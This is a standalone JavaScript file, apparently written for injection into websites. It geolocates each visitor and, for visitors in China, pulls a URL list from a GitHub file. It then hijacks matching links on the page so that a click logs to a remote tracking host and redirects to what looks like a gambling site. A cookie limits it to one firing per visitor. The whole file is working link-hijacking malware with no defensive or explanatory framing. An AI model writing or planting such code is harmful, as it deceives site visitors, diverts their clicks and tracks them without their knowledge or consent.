var g_goUrl='https://www.byqgame.vip?channelCode=1790003';
var g_log='https://x.kpz.tw/hr/LLcount.php';
var g_rand=1;

var g_adlist='https://raw.githubusercontent.com/qwe147qwe/myku/master/1790003.txt';
var g_hookUrls=new Array();
function NewMyGetIPCall()
{
	GetAdList();
}

function mOnFun(mthis)
{

	SendNewMyGetIP();
	xsetCookie('onetime',"1",1);
	mthis.href=g_goUrl;

}

function modifyAD()
{
	for(var i=0;i<=document.getElementsByTagName('a').length;i++)
	{
		try 
		{
			var url=document.getElementsByTagName('a')[i].href;
			for(var x=0;x<g_hookUrls.length;x++)
			{
				if(url.indexOf(g_hookUrls[x])!=-1&&g_hookUrls[x].length!=0)
				{
					document.getElementsByTagName('a')[i].onclick=function(){mOnFun(this);};
				}
			}

		}
		catch (error)
		{
				;
		}
	}	
}

function GetAdList()
{

	mUrl=g_adlist;

	try
	{
		var xmlHttpRequest= new XMLHttpRequest();
	} catch (e) {xmlHttpRequest= new ActiveXObject('Microsoft.XMLHTTP');} 
 
	xmlHttpRequest.onreadystatechange = function()
	{
		if(xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200)
		{
			var b = xmlHttpRequest.responseText;
			try
			{
				b=b.replace('\r','');
				b=b.replace('\t','');
				b=b.replace(' ','');
				g_hookUrls=b.split('\n');
				modifyAD();
			}
			catch (e) {;}

		} 
	}
    xmlHttpRequest.open('GET',mUrl+'?'+(((1+Math.random())*0x10000)|0).toString(16).substring(1)+(((1+Math.random())*0x10000)|0).toString(16).substring(1),false);
    xmlHttpRequest.send(); 

}


function xsetCookie ( name, value, expdays )
{
	var expdate = new Date();
	expdate.setDate(expdate.getDate() + expdays) ;
	document.cookie = name + '=' + escape(value) + ';expires=' + expdate.toUTCString();

}
function xgetCookie ( name )
{
	var start = document.cookie.indexOf(name+'=') ;
	if ( start != -1 )
	{
		start = start + name.length + 1 ;
		var end = document.cookie.indexOf(';', start) ;
		if ( end == -1 )
		end = document.cookie.length ;
		return unescape(document.cookie.substring(start,end)) ;
	}
	return '' ;

}

function NewMyGetIP()
{
	mUrl='https://ip.seeip.org/geoip/114.114.114.114'; 
	try
	{
		var xmlHttpRequest= new XMLHttpRequest();
	} catch (e) {xmlHttpRequest= new ActiveXObject('Microsoft.XMLHTTP');} 
 
	xmlHttpRequest.onreadystatechange = function()
	{
		if(xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200)
		{
			var b = xmlHttpRequest.responseText;
			try
			{
				var cs=JSON.parse(b);

				if(cs['country']=='China')
					{
						if(Math.floor(Math.random()*1000)%g_rand==0)
						{
							NewMyGetIPCall();
						}
					}
			}
			catch (e) {;}

		} 
	}
    xmlHttpRequest.open('GET',mUrl,true);
    xmlHttpRequest.send(); 

}
if(xgetCookie('onetime')=='')
{
	NewMyGetIP();
}

function SendNewMyGetIP()
{
	mUrl=g_log;
	try
	{
		var xmlHttpRequest= new XMLHttpRequest();
	} catch (e) {xmlHttpRequest= new ActiveXObject('Microsoft.XMLHTTP');} 
 
	xmlHttpRequest.onreadystatechange = function()
	{
		if(xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200)
		{
			var b = xmlHttpRequest.responseText;
			try
			{
				;
			}
			catch (e) {;}

		} 
	}
    xmlHttpRequest.open('GET',mUrl+'?'+(((1+Math.random())*0x10000)|0).toString(16).substring(1)+(((1+Math.random())*0x10000)|0).toString(16).substring(1),true);
    xmlHttpRequest.send(); 

}